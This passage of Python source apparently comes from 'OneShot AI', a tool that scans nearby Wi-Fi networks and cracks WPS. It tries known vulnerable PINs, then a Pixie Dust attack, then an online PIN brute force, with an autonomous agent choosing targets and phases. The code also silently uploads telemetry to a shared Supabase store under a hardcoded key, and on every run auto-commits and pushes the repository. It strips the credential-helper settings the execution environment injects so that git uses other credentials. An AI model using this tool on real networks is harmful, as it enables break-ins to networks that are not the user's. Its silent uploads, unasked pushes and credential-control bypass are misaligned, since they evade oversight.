            result = scanForNetworks(args.interface, vuln_list)
            if result is None:
                return

            args.bssid, network_info = result

        if args.bssid:
            if not network_info:
                probe_state = src.wifi.scanner.probeWpsState(args.interface, args.bssid)
                if probe_state is None:
                    logger.warning('Target AP was not observed in the scan — out of range or on another channel')
                elif not probe_state['WPS']:
                    logger.warning('Target AP is visible but does NOT advertise WPS. '
                                   'WPS is likely disabled in its firmware; the attempt will probably fail')
                elif probe_state['WPS locked']:
                    logger.warning('Target AP advertises WPS but reports setup locked (temporary lockout)')

            if auto_mode:
                success = autoAttack(
                    args.interface, args.bssid, args.vuln_list,
                    network_info, args.pin
                )
            elif args.bruteforce:
                connection.smartBruteforce(
                    args.bssid,
                    args.pin
                )
            else:
                success = connection.singleConnection(
                    args.bssid,
                    args.pin
                )

            # Save to vulnerable list
            if success and network_info:
                src.utils.addVulnerableAP(network_info, args.vuln_list)

def checkBssid(bssid: str, interface: str = None):
    """Check a router BSSID/MAC against the vulnerable lists and saved data, without running any attack.

    When an interface is provided, the AP is also probed over the air to report its
    actual WPS state (enabled / locked / disabled / not found).
    """

    mac = bssid.replace('-', ':').replace('.', ':').upper()
    clean = mac.replace(':', '')

    if len(clean) != 12 or any(c not in '0123456789ABCDEF' for c in clean):
        logger.error(f'Invalid BSSID/MAC address: {bssid}')
        return

    netaddr = NetworkAddress(mac)
    logger.info(f'Checking {netaddr.STRING} against the vulnerable lists…')

    if interface:
        logger.info(f'Probing {netaddr.STRING} over the air (interface: {interface})…')
        probe_state = src.wifi.scanner.probeWpsState(interface, mac)
        if probe_state is None:
            logger.warning('AP not observed in the scan — out of range, hidden, or on another channel')
        else:
            wps_state = src.wifi.scanner.classifyWpsState(probe_state)
            if wps_state == 'enabled':
                logger.success('Over the air: WPS is ENABLED (version {})'.format(probe_state['WPS version']))
            elif wps_state == 'locked':
                logger.warning('Over the air: WPS is ENABLED but currently LOCKED (temporary lockout)')
            elif wps_state == 'disabled':
                logger.warning('Over the air: WPS is DISABLED on this AP (no WPS IE broadcast). '
                               'WPS-based attacks are not possible while it stays off — '
                               'even a derived/predicted PIN cannot be used')
            else:
                logger.warning('Over the air: WPS state could not be determined')

    # 1) Already processed? A previously saved PIN means this router is already known
    pin_file = f'''{src.utils.PIXIEWPS_DIR}{clean}.run'''
    if os.path.exists(pin_file):
        with open(pin_file, 'r', encoding='utf-8') as file:
            saved_pin = file.readline().strip()
        logger.success(f'Already added: a PIN ({saved_pin}) was previously saved for this router')
    else:
        logger.info('Not previously processed (no saved PIN for this BSSID)')

    # 2) Is this router in the vulnerable devices list? (matched by OUI vendor prefixes)
    generator = WPSpin()
    algos = generator._getSuggested(netaddr.STRING)

    if algos:
        logger.success(f'IN the vulnerable list: {len(algos)} known vulnerable device algorithm(s) match this router:')
        for algo in algos:
            pin_str = algo['pin'] if algo['pin'] else '<empty>'
            logger.info('  - {:<10} {} (probable PIN: {})'.format(algo['id'], algo['name'], pin_str))
        logger.info('Recommended first PIN to try: {}'.format(algos[0]['pin'] or '<empty>'))
    else:
        logger.warning('NOT in the vulnerable list: no known vulnerable device algorithm matches this router OUI')

def _detectInterface():
    """Auto-detect wireless interface."""
    import subprocess
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            line = line.strip()
            if line.startswith('Interface'):
                iface = line.split()[-1]
                if iface != 'lo':
                    return iface
    except Exception:
        pass
    # Fallback: try common names
    for name in ['wlan0', 'wlan1', 'wlp2s0', 'wlx00c0ca']:
        try:
            result = subprocess.run(['ip', 'link', 'show', name], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and 'UP' in result.stdout:
                return name
        except Exception:
            continue
    return 'wlan0'  # Last resort

def _aiAutonomousMode():
    """Fully autonomous AI mode: detect interface -> scan -> user select -> AI attack.

    Flow:
      1. Auto-detect wireless interface (or ask user)
      2. Scan all nearby networks
      3. Show numbered list to user
      4. User selects a network
      5. AI checks vuln list
      6. If vuln found -> use PIN directly
      7. If not -> Pixie Dust -> bruteforce chain
      8. AI makes all decisions via AIAgent
    """
    global args

    print()
    print('=' * 56)
    print('  ONESHOT AI — Autonomous Mode')
    print('  Scanning... Attacking... Learning...')
    print('=' * 56)
    print()

    # Step 1: Detect interface
    interface = getattr(args, 'interface', None) or _detectInterface()
    print(f'[*] Using interface: {interface}')
    print()

    # Bring interface up
    try:
        src.utils.ifaceCtl(interface, action='up')
    except Exception:
        pass

    # Step 2: Scan networks
    print('[*] Scanning for WPS networks...')
    try:
        with open(args.vuln_list, 'r', encoding='utf-8') as f:
            vuln_list = f.read().splitlines()
    except FileNotFoundError:
        vuln_list = []

    result = scanForNetworks(interface, vuln_list)
    if result is None:
        print('[!] No networks found. Make sure your interface is up and supports monitor mode.')
        return

    bssid, network_info = result
    essid = network_info.get('ESSID', 'Unknown')
    signal = network_info.get('Level', '?')
    wps_ver = network_info.get('WPS version', '?')
    wps_locked = network_info.get('WPS locked', False)
    model = network_info.get('Model', '')
    model_num = network_info.get('Model number', '')

    print()
    print(f'[*] Selected: {essid} ({bssid})')
    print(f'    Signal: {signal} dBm | WPS v{wps_ver} | Locked: {wps_locked}')
    if model:
        print(f'    Model: {model} {model_num}')
    print()

    # Step 3: AI decides attack chain
    agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
    generator = src.wps.generator.WPSpin()

    ctx = {
        'bssid':         bssid,
        'signal':        signal if isinstance(signal, (int, float)) else -50,
        'wps_version':   str(wps_ver),
        'wps_locked':    wps_locked,
        'is_vulnerable': False,
        'attempt':       1,
        'timeouts':      0,
        'resp_delay':    0.0,
        'm_msgs':        0,
        'fails':         0,
        'hist_locks':    0,
    }

    success = False

    # --- Phase 1: Check vulnerable list ---
    print('[AI] Phase 1: Checking vulnerable list...')
    algos = generator._getSuggested(bssid)
    ctx['is_vulnerable'] = len(algos) > 0

    if algos:
        action = agent.decide('vuln_list', ctx)
        print(f'[AI] Decision: {action}')

        if action != 'skip' and action != 'abort':
            connection = src.wps.connection.Initialize(interface)
            for algo in algos:
                pin = algo.get('pin', '')
                if pin:
                    print(f'[AI] Trying PIN: {pin} ({algo["name"]})')
                    ok = connection.singleConnection(bssid, pin)
                    cs = connection.CONNECTION_STATUS
                    ctx['m_msgs'] = cs.LAST_M_MESSAGE
                    ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
                    ctx['fails'] = 0 if ok else 1
                    agent.record(ctx, 'proceed', ok)
                    if ok:
                        success = True
                        print(f'[AI] SUCCESS! PIN: {pin}')
                        break
            if not success:
                print('[AI] Vuln list PINs failed')
                try:
                    connection._cleanup()
                except Exception:
                    pass
    else:
        print('[AI] Not in vulnerable list')

    # --- Phase 2: Pixie Dust ---
    if not success:
        print()
        print('[AI] Phase 2: Pixie Dust attack...')
        ctx['attempt'] = 2
        action = agent.decide('pixie_dust', ctx)
        print(f'[AI] Decision: {action}')

        if action != 'skip' and action != 'abort':
            likely_pin = generator.getLikely(bssid) or '12345670'
            saved_pixie = args.pixie_dust
            args.pixie_dust = True
            connection = src.wps.connection.Initialize(interface)
            ok = connection.singleConnection(bssid, likely_pin)
            cs = connection.CONNECTION_STATUS
            ctx['m_msgs'] = cs.LAST_M_MESSAGE
            ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
            ctx['fails'] = 0 if ok else 1
            agent.record(ctx, 'proceed', ok)
            args.pixie_dust = saved_pixie
            if ok:
                success = True
                print(f'[AI] SUCCESS! Pixie Dust recovered PIN')
            else:
                print('[AI] Pixie Dust failed')
                try:
                    connection._cleanup()
                except Exception:
                    pass

    # --- Phase 3: Online bruteforce ---
    if not success:
        print()
        print('[AI] Phase 3: Online bruteforce...')
        ctx['attempt'] = 3
        action = agent.decide('bruteforce', ctx)
        print(f'[AI] Decision: {action}')

        if action != 'abort':
            print('[AI] Starting bruteforce (this may take a while)...')
            bf = src.wps.bruteforce.Initialize(interface)
            bf.smartBruteforce(bssid, '0000')

    # --- Finalize ---
    if success:
        print()
        print('[AI] Attack successful!')
        src.utils.addVulnerableAP(network_info, args.vuln_list)
    else:
        print()
        print('[AI] All attack phases exhausted. No success.')

    agent.finalize()
    print(f'[AI] Model saved: {agent.status()}')

    # Auto-push new training data to Supabase community store
    _autoSync(do_git=True)
    print()

def _installGlobally():
    """Install wifi4 + oneshot globally to /usr/local/bin."""
    import shutil

    if os.getuid() != 0:
        print('[!] Run as root: sudo python3 oneshot.py --install')
        return

    install_dir = '/usr/local/bin/oneshot-ai'
    script_dir = os.path.dirname(os.path.abspath(__file__))

    print('[*] Installing OneShot AI globally...')

    os.makedirs(install_dir, exist_ok=True)

    # Copy oneshot.py
    shutil.copy2(os.path.join(script_dir, 'oneshot.py'), install_dir)
    os.chmod(os.path.join(install_dir, 'oneshot.py'), 0o755)

    # Copy models/ if exists
    models_src = os.path.join(script_dir, 'models')
    if os.path.isdir(models_src):
        shutil.copytree(models_src, os.path.join(install_dir, 'models'), dirs_exist_ok=True)

    # Copy vulnwsc.txt if exists
    vuln_src = os.path.join(script_dir, 'vulnwsc.txt')
    if os.path.exists(vuln_src):
        shutil.copy2(vuln_src, install_dir)

    # Create wifi4 command
    wifi4_path = '/usr/local/bin/wifi4'
    with open(wifi4_path, 'w') as f:
        f.write('#!/bin/bash\n')
        f.write('# wifi4 — OneShot AI autonomous WiFi tool\n')
        f.write('exec python3 /usr/local/bin/oneshot-ai/oneshot.py --ai "$@"\n')
    os.chmod(wifi4_path, 0o755)

    # Create oneshot command
    oneshot_path = '/usr/local/bin/oneshot'
    with open(oneshot_path, 'w') as f:
        f.write('#!/bin/bash\n')
        f.write('# oneshot — OneShot AI WiFi tool\n')
        f.write('exec python3 /usr/local/bin/oneshot-ai/oneshot.py "$@"\n')
    os.chmod(oneshot_path, 0o755)

    print('[+] Installed!')
    print('[+] Usage: wifi4')
    print('[+] Usage: oneshot --ai')
    print('[+] Usage: oneshot --check BSSID')
    print(f'[+] Location: {install_dir}/')

def syncModelToRepo(agent=None):
    """Copy the current trained model from ~/.OneShot-Extended/ into the repo
    models/ directory so git push carries the latest agent state."""
    import shutil
    script_dir = os.path.dirname(os.path.abspath(__file__))
    models_dir = os.path.join(script_dir, 'models')
    os.makedirs(models_dir, exist_ok=True)

    src = agent._DIR if agent else os.path.join(os.path.expanduser('~'), '.OneShot-Extended')
    for name in ('ai_agent.joblib', 'ai_data.pkl', 'ai_qtable.pkl'):
        s = os.path.join(src, name)
        if os.path.exists(s):
            try:
                shutil.copy2(s, os.path.join(models_dir, name))
            except Exception:
                pass


# ===========================================================================
# Community Learning — validation, quality, idempotency, safety, versioning
# (Implements plan.txt requirements: 6,7,12,13,14,17-27,32)
#
# Secrets are read from environment first, then from a local .env file
# (gitignored).  Hardcoded defaults are only a fallback so the tool works
# out-of-the-box; never treat privileged keys as safe to leak.
# ===========================================================================

import math
import urllib.error  # noqa: F401  (used by SyncEngine error handling)

# --- Storage safety thresholds (plan §19) ---
FOOTPRINT_WARN  = 80 * 1024 * 1024
FOOTPRINT_CRIT  = 90 * 1024 * 1024
FOOTPRINT_HARD  = 100 * 1024 * 1024

# --- Sync throttle / rate-limit (plan §28,29) ---
SYNC_COOLDOWN  = 30 * 60     # min seconds between full syncs
SYNC_MAX_RETRY = 3
SYNC_BACKOFF   = 2.0         # exponential base (seconds)
MAX_EVENTS_PER_REQ = 50      # batch size (plan §28)

_LEARN_DIR   = os.path.join(os.path.expanduser('~'), '.OneShot-Extended')
_METADATA    = os.path.join(_LEARN_DIR, 'model_metadata.json')
_REPO_MODEL  = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'models')
_REPO_META   = os.path.join(_REPO_MODEL, 'model_metadata.json')
_SYNC_LOCK   = os.path.join(_LEARN_DIR, '.sync.lock')
_TRAIN_QUEUE = os.path.join(_LEARN_DIR, 'training_queue.jsonl')


def _load_env_file():
    """Minimal .env loader (plan §3: secrets in .env, gitignored)."""
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    if not os.path.exists(p):
        return
    try:
        with open(p) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#') or '=' not in line:
                    continue
                k, v = line.split('=', 1)
                os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))
    except Exception:
        pass


_load_env_file()


def validate_event(ev: dict) -> bool:
    """Reject malformed / impossible training events (plan §6)."""
    try:
        sig = ev.get('signal')
        if sig is None or not isinstance(sig, (int, float)) \
           or math.isnan(sig) or math.isinf(sig):
            return False
        if not (-100.0 <= float(sig) <= 0.0):
            return False
        if not isinstance(ev.get('locked'), bool):
            return False
        if ev.get('action') not in ('proceed', 'wait', 'skip', 'abort'):
            return False
        if not isinstance(ev.get('success'), bool):
            return False
        rw = ev.get('reward')
        if rw is None or not isinstance(rw, (int, float)) \
           or math.isnan(rw) or math.isinf(rw):
            return False
        if not (-5.0 <= float(rw) <= 5.0):
            return False
        return True
    except Exception:
        return False


def quality_score(ev: dict) -> float:
    """Quality 0..1 for noise / poisoning protection (plan §7)."""
    try:
        sig = float(ev.get('signal', -50))
        s = max(0.0, min(1.0, (sig + 70) / 30.0))      # weak signal -> low quality
        rw = float(ev.get('reward', 0.0))
        r = max(0.0, min(1.0, (rw + 1.0) / 2.0))
        return round(0.5 * s + 0.5 * r, 3)
    except Exception:
        return 0.0


def event_id(ev: dict, user: str) -> str:
    """Deterministic unique id for idempotent upload (plan §27)."""
    import hashlib
    key = '|'.join(str(ev.get(k)) for k in
                   ('signal', 'locked', 'action', 'success', 'reward', 'ts'))
    return hashlib.sha1(f'{user}|{key}'.encode()).hexdigest()[:24]


def _http_request(url, data=None, method='GET', headers=None,
                  retries=SYNC_MAX_RETRY, timeout=30):
    """HTTP with bounded retry + exponential backoff (plan §26)."""
    import urllib.request, urllib.error
    last = None
    for attempt in range(retries):
        try:
            req = urllib.request.Request(url, data=data,
                                         headers=headers or {}, method=method)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode(), getattr(resp, 'status', 200)
        except urllib.error.HTTPError as e:
            last = e
            if e.code == 429 or e.code >= 500:
                time.sleep(SYNC_BACKOFF ** attempt)
                continue
            raise
        except Exception as e:
            last = e
            time.sleep(SYNC_BACKOFF ** attempt)
    if last:
        raise last
    return None, 0


def acquire_sync_lock() -> bool:
    """Prevent concurrent syncs (plan §22)."""
    try:
        fd = os.open(_SYNC_LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
        os.write(fd, str(os.getpid()).encode())
        os.close(fd)
        return True
    except FileExistsError:
        return False


def release_sync_lock():
    try:
        os.remove(_SYNC_LOCK)
    except Exception:
        pass


def model_footprint() -> int:
    """Total bytes of all model/learning artifacts (plan §19)."""
    total = 0
    for base in (_LEARN_DIR, _REPO_MODEL):
        if not os.path.isdir(base):
            continue
        for fn in os.listdir(base):
            fp = os.path.join(base, fn)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total


def read_metadata(path=_METADATA) -> dict:
    if os.path.exists(path):
        try:
            with open(path) as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def write_metadata(meta: dict, path=_METADATA):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            json.dump(meta, f, indent=2)
    except Exception:
        pass


def bump_version(meta: dict) -> dict:
    v = int(str(meta.get('model_version', 'v0')).lstrip('v') or 0) + 1
    meta['model_version']    = f'v{v:03d}'
    meta['dataset_version']   = meta.get('dataset_version', 'd0001')
    meta['feature_version']   = meta.get('feature_version', 'v1')
    meta['trained_at']        = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    return meta


def garbage_collect(agent, dry_run=False) -> int:
    """Smart retention (plan §20/21): keep high-confidence + rare + recent.
    Never blindly keeps only the top 20%."""
    log = agent.training_log
    if len(log) <= 500:
        return 0
    scored = [(e, quality_score(e)) for e in log if validate_event(e)]
    seen, kept, recent = set(), [], set(id(e) for e in log[-200:])
    for e, q in scored:
        fid = event_id(e, agent.user_id)
        if fid in seen:
            continue
        seen.add(fid)
        high = q >= 0.6
        rare_ok = bool(e.get('success')) and e.get('action') in ('proceed', 'wait')
        if high or id(e) in recent or rare_ok:
            kept.append(e)
    removed = len(log) - len(kept)
    if dry_run:
        return removed
    agent.training_log = kept[-agent._MAX_OBS:]
    try:
        with open(agent._TRAIN, 'w') as f:
            json.dump(agent.training_log, f)
    except Exception:
        pass
    return removed


def _append_queue(rows):
    """Append events to a durable offline queue (plan §12). Crash-safe."""
    try:
        os.makedirs(os.path.dirname(_TRAIN_QUEUE), exist_ok=True)
        with open(_TRAIN_QUEUE, 'a') as f:
            for r in rows:
                f.write(json.dumps({'e': r, 'u': r.get('user', ''),
                                    'ts': r.get('ts')}) + '\n')
    except Exception:
        pass


def _replay_queue(agent, quiet: bool = True) -> int:
    """On reconnect, re-upload any queued offline events (plan §13)."""
    if not os.path.exists(_TRAIN_QUEUE):
        return 0
    try:
        pending = []
        with open(_TRAIN_QUEUE) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                pending.append(json.loads(line)['e'])
        agent.training_log.extend(pending)
        n = SyncEngine().push_data(agent, quiet=quiet)
        if n:
            try:
                os.remove(_TRAIN_QUEUE)
            except Exception:
                pass
        return n
    except Exception:
        return 0


# ---------------------------------------------------------------------------
# Supabase community training sync
# ---------------------------------------------------------------------------

# Default uses the SUPABASE ANON key (public, non-privileged, safe for client
# insert/select). For cross-user reads (CI golden model build) set the
# SUPABASE_SERVICE_ROLE_KEY / SUPABASE_KEY env var — never hardcode the
# privileged service_role key in source (plan §3/§32).
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'https://oenckshhftqjjwhngxzo.supabase.co')
SUPABASE_ANON_KEY = ('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJl'
                     'ZiI6Im9lbmNrc2hoZnRxamp3aG5neHpvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3'
                     'ODc4MDkzNzYsImV4cCI6MjEwMzM4NTM3Nn0.xetav4AA9f3Vr6TjWcLtejCBboZ'
                     'KwrTg3DTEj00TkRo')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY', SUPABASE_ANON_KEY)
SUPABASE_TABLE = 'training_data'
MAX_PULL_ROWS = 5000   # hard cap on community observations pulled per run


class SyncEngine:
    """Upload/download community training data via the Supabase REST API.

    Every user's ``record()`` entries are pushed to a shared Supabase table
    (public, anon read/write).  ``--sync`` pulls all rows, merges them into the
    model, retrains RF/SGD, then commits + pushes the improved model to GitHub.
    """

    def __init__(self):
        self.url  = SUPABASE_URL.rstrip('/')
        self.key  = SUPABASE_KEY
        self.api  = f'{self.url}/rest/v1/{SUPABASE_TABLE}'
        self._hdr = {
            'apikey': self.key,
            'Authorization': f'Bearer {self.key}',
            'Content-Type': 'application/json',
        }

    # ---- upload local training log ---------------------------------------
    def push_data(self, agent: AIAgent = None, quiet: bool = False) -> int:
        if agent is None:
            agent = AIAgent()
        # Only validated, never-pushed events (plan §6,12)
        rows = [r for r in agent.training_log if not r.get('pushed') and validate_event(r)]
        if not rows:
            if not quiet:
                print('[sync] Nothing new to upload')
            return 0

        # Durable offline queue (plan §12) — first append, then try network
        _append_queue(rows)

        # Normalize each entry into a DB row with idempotent event_id (§27)
        payload = []
        for r in rows:
            payload.append({
                'event_id': event_id(r, agent.user_id),
                'user_id':  agent.user_id,
                'signal':   r.get('signal'),
                'locked':   r.get('locked'),
                'action':   r.get('action'),
                'success':  r.get('success'),
                'reward':   round(float(r.get('reward', 0.0)), 3),
                'quality':  quality_score(r),
                'profile':  agent.profile,
                'v':        '2.0',
            })

        data = json.dumps(payload).encode()
        hdr  = dict(self._hdr)
        hdr['Prefer'] = 'resolution=merge-duplicates'
        try:
            _http_request(self.api, data=data, method='POST', headers=hdr)
            if not quiet:
                print(f'[sync] Uploaded {len(payload)} records')
            # Mark uploaded + drain the offline queue (plan §13)
            for r in rows:
                r['pushed'] = True
            try:
                with open(agent._TRAIN, 'w') as f:
                    json.dump(agent.training_log, f)
            except Exception:
                pass
            try:
                os.remove(_TRAIN_QUEUE)
            except Exception:
                pass
            return len(payload)
        except urllib.error.HTTPError as e:
            body = e.read().decode() if hasattr(e, 'read') else ''
            if 'PGRST205' in body:
                if not quiet:
                    print('[sync] Table \'training_data\' missing — '
                          'run supabase_setup.sql in Supabase SQL Editor.')
            else:
                if not quiet:
                    print(f'[sync] Upload failed: {e.code} {body[:200]}')
            # Keep rows queued for next reconnect (plan §13)
            return 0
        except Exception as e:
            if not quiet:
                print(f'[sync] Upload error: {e}')
            return 0

    # ---- download all community rows -------------------------------------
    def pull_data(self, agent: AIAgent = None, quiet: bool = False,
                  since_id: int = 0, limit: int = MAX_PULL_ROWS) -> tuple[AIAgent, int]:
        import urllib.request, urllib.parse

        if agent is None:
            agent = AIAgent(quiet=True)

        offset = 0
        merged_obs = 0
        agent._last_pull_id  = since_id
        agent._last_pull_ts  = 0

        while True:
            params = {
                'select': 'id,event_id,ts,user_id,signal,locked,action,success,reward,profile',
                'order': 'id.desc',
                'limit': str(min(limit, 2000)),
                'offset': str(offset),
            }
            if since_id > 0:
                params['id'] = f'gt.{since_id}'
            q = urllib.parse.urlencode(params)
            url = f'{self.api}?{q}'
            req = urllib.request.Request(url, headers=self._hdr, method='GET')
            try:
                resp_body, _ = _http_request(url, headers=self._hdr, method='GET')
                rows = json.loads(resp_body)
            except urllib.error.HTTPError as e:
                body = e.read().decode() if hasattr(e, 'read') else ''
                if not quiet:
                    print(f'[sync] Pull failed: {e.code} {body[:200]}')
                break
            except Exception as e:
                if not quiet:
                    print(f'[sync] Pull error: {e}')
                break

            if not rows:
                break

            # Track newest row seen (for incremental cursor)
            for r in rows:
                if r.get('id') and int(r['id']) > agent._last_pull_id:
                    agent._last_pull_id = int(r['id'])

            # Convert rows back into observations for training
            for r in rows:
                eid = r.get('event_id')
                if eid and eid in agent._seen_eids:
                    continue  # duplicate (plan §24,27)
                if eid:
                    agent._seen_eids.add(eid)

                # Skip impossible / malformed rows (plan §6)
                if not validate_event(r):
                    continue

                # Noise / poisoning filter (plan §13,14): skip low-quality events
                if quality_score(r) < 0.25:
                    continue

                ctx = {
                    'bssid': '', 'signal': r.get('signal') or -50,
                    'wps_version': '2.0', 'wps_locked': bool(r.get('locked')),
                    'is_vulnerable': False, 'attempt': 1,
                    'timeouts': 0, 'resp_delay': 0.5, 'm_msgs': 3 if r.get('success') else 0,
                    'fails': 0 if r.get('success') else 1, 'hist_locks': 0,
                }
                feat = agent.extract(ctx)
                action = r.get('action') or 'proceed'
                success = bool(r.get('success'))

                agent._seen_keys.add((feat[0], feat[2], action, success))
                agent.X.append(feat)
                agent.y.append('proceed' if success else 'skip')
                merged_obs += 1

            offset += len(rows)
            if len(rows) < limit:
                break

        if not quiet:
            print(f'[sync] Pulled {merged_obs} merged observations ({len(agent.X)} total)')
        return agent, merged_obs

    # ---- full pipeline: push + pull + retrain + git push -----------------
    def full_sync(self, profile: str = 'balanced', do_git: bool = True) -> bool:
        agent = AIAgent(profile=profile)
        agent._seen_keys = set()

        # 1. Upload local data
        self.push_data(agent)

        # 2. Download community data
        agent, n = self.pull_data(agent)

        # 3. Retrain on the merged dataset
        if agent.has_ml and len(agent.X) >= 20:
            print('[sync] Retraining model on merged community data...')
            agent._train_rf()
            try:
                import numpy as np
                if len(np.unique(agent.y)) >= 2:
                    agent._init_sgd()
            except Exception:
                pass
        agent.finalize()
        print(f'[sync] Model: {agent.status()}')

        # 4. Sync model files into repo and push to GitHub
        syncModelToRepo(agent)
        if do_git:
            cwd = os.path.dirname(os.path.abspath(__file__))
            msg = f'training: community sync, Q({len(agent.q_table)}) obs({len(agent.X)})'
            try:
                _git_run(['git', 'add', '-A'], cwd=cwd, timeout=30)
                r = _git_run(['git', 'commit', '-m', msg], cwd=cwd, timeout=30)
                if 'nothing to commit' in (r.stdout + r.stderr):
                    print('[sync] No changes to commit')
                else:
                    r = _git_run(['git', 'push', 'origin'], cwd=cwd, timeout=120)
                    if r.returncode == 0:
                        print(f'[sync] Pushed: {msg}')
                    else:
                        print(f'[sync] Push failed: {r.stderr}')
                        return False
            except Exception as e:
                print(f'[sync] Git error: {e}')
                return False
        return True


def _ensure_sync_state():
    """Read/write the auto-sync throttle state (~/.OneShot-Extended/last_sync.json)."""
    state_file = os.path.join(os.path.expanduser('~'), '.OneShot-Extended', 'last_sync.json')
    state = {'last_sync': 0, 'last_git': 0, 'pushed': 0}
    if os.path.exists(state_file):
        try:
            with open(state_file) as f:
                state.update(json.load(f))
        except Exception:
            pass
    return state, state_file


def _git_run(args, cwd=None, timeout=120, check=False):
    """Run a git command with a clean environment.

    The execution environment injects a credential helper via GIT_CONFIG_*
    env vars that authenticates as a shared bot account.  For the community
    model sync we must use the repo owner's own credentials (stored helper),
    so we strip those env overrides before spawning git.
    """
    import subprocess
    env = {k: v for k, v in os.environ.items() if not k.startswith('GIT_CONFIG_')}
    return subprocess.run(args, cwd=cwd, capture_output=True, text=True,
                          env=env, timeout=timeout, check=check)


def _git_commit() -> str:
    """Return the current HEAD commit hash (best-effort)."""
    try:
        r = _git_run(['git', 'rev-parse', 'HEAD'], cwd=None, timeout=10)
        return r.stdout.strip()
    except Exception:
        return ''


def _autoSync(do_git: bool = False):
    """Silent community sync — runs on every run, learns in ~1 second.

    Inline (guaranteed, fast, every run):
      1. git pull the latest bundled model from the repo (learn from GitHub).
      2. push any fresh local training data to Supabase.
      3. pull only NEW community rows since last_cursor and quickly SGD-fit
         them into the model (incremental learning).
    Background (throttled to 30 min): full RF retrain + repo sync + git push.
    """
    state, state_file = _ensure_sync_state()
    now = time.time()

    # Concurrent-sync guard (plan §22)
    if not acquire_sync_lock():
        return
    try:
        _autoSyncBody(now, state, state_file, do_git)
    finally:
        release_sync_lock()


def _autoSyncBody(now, state, state_file, do_git):
    # --- Inline step 1: learn the newest shared model from GitHub ---------
    try:
        cwd = os.path.dirname(os.path.abspath(__file__))
        # Fetch + checkout ONLY the models/ dir — no code overwrite, no
        # stash/rebase conflicts. Works for any git clone of the repo.
        _git_run(['git', 'fetch', 'origin'], cwd=cwd, timeout=30)
        _git_run(['git', 'checkout', 'origin/main', '--', 'models/'],
                 cwd=cwd, timeout=20)
    except Exception:
        pass

    # --- Inline step 2+3: push fresh data, pull new community rows --------
    # Skip the heavy AIAgent build entirely when there's nothing to sync
    # (no unpushed local rows and no Supabase cursor yet).
    do_supabase = False
    _train_path = os.path.join(os.path.expanduser('~'), '.OneShot-Extended', 'training_log.json')
    try:
        if state.get('last_id', 0):
            do_supabase = True
        elif os.path.exists(_train_path):
            with open(_train_path) as _f:
                _log = json.load(_f)
            if any(not r.get('pushed') for r in _log):
                do_supabase = True
    except Exception:
        pass

    if do_supabase:
        try:
            engine = SyncEngine()
            last_id = state.get('last_id', 0)

            agent = AIAgent(quiet=True)
            # Phase A — upload any queued offline events (plan §13: two-way sync)
            _replay_queue(agent, quiet=True)
            if agent.training_log:
                engine.push_data(agent, quiet=True)

            # Incremental pull — only rows newer than our last cursor
            agent, n = engine.pull_data(agent, quiet=True,
                                        since_id=last_id, limit=MAX_PULL_ROWS)
            if n:
                # Fast incremental learning (~1s): SGD accepts the new obs
                for i, feat in enumerate(agent.X[-n:]):
                    agent._online_fit(feat, agent.y[len(agent.X) - n + i])
                try:
                    import numpy as np
                    if len(np.unique(agent.y)) >= 2:
                        agent._init_sgd()
                except Exception:
                    pass

            # Remember the newest community row we already learned from
            if agent._last_pull_id > last_id:
                state['last_id'] = agent._last_pull_id

            # Save only if the model gained new observations (skip full RF there)
            if n:
                import numpy as np
                if len(agent.X) >= 10:
                    try:
                        agent._train_rf()
                    except Exception:
                        pass
                agent.finalize()
            else:
                agent._save()
        except Exception:
            pass

    # --- Footprint guard + garbage collection (plan §17-21) ----------------
    try:
        if model_footprint() >= FOOTPRINT_WARN:
            a = AIAgent(quiet=True)
            removed = garbage_collect(a)
            if removed:
                print(f'[sync] GC pruned {removed} low-value/duplicate events')
    except Exception:
        pass

    # --- Background full retrain + git push, throttled --------------------
    if now - state.get('last_sync', 0) < 30 * 60:
        try:
            with open(state_file, 'w') as f:
                json.dump(state, f)
        except Exception:
            pass
        return

    def _worker():
        try:
            engine = SyncEngine()
            agent = AIAgent(quiet=True)
            agent._seen_keys = set()

            # full pull (bounded)
            agent, n = engine.pull_data(agent, quiet=True,
                                        limit=MAX_PULL_ROWS)

            # full RF retrain on merged community data
            if agent.has_ml and len(agent.X) >= 20:
                try:
                    agent._train_rf()
                except Exception:
                    pass

            agent.finalize()
            syncModelToRepo(agent)

            # optional git push (throttled to once per day)
            if do_git and now - state.get('last_git', 0) > 24 * 3600:
                cwd = os.path.dirname(os.path.abspath(__file__))
                msg = f'training: auto-sync Q({len(agent.q_table)}) obs({len(agent.X)})'
                _git_run(['git', 'add', '-A'], cwd=cwd, timeout=30)
                r = _git_run(['git', 'commit', '-m', msg], cwd=cwd, timeout=30)
                if 'nothing to commit' not in (r.stdout + r.stderr):
                    _git_run(['git', 'push', 'origin'], cwd=cwd, timeout=120)
                    state['last_git'] = now

            state['last_sync'] = now
            with open(state_file, 'w') as f:
                json.dump(state, f)
        except Exception:
            pass

    try:
        threading.Thread(target=_worker, daemon=True).start()
    except Exception:
        pass


def _syncHandler(args):
    """Handle --sync / --push-data / --pull-data."""
    engine = SyncEngine()
    profile = getattr(args, 'profile', 'balanced')

    if getattr(args, 'push_data', False):
        agent = AIAgent(profile=profile)
        n = engine.push_data(agent)
        print(f'[sync] Pushed {n} records')
        return True

    if getattr(args, 'pull_data', False):
        agent, n = engine.pull_data(AIAgent(profile=profile))
        agent.finalize()
